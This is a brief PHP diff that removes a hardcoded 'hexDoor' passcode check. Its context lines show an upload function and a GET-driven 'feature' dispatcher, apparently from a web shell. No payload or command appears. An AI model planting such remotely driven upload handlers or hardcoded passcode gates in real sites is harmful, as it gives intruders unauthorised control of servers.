@@ -75,9 +75,6 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
-if ($_GET['passcode'] == 'hexDoor') {
-    die();
-}
 if (isset($_GET["feature"])) {
 
     $response = NULL;
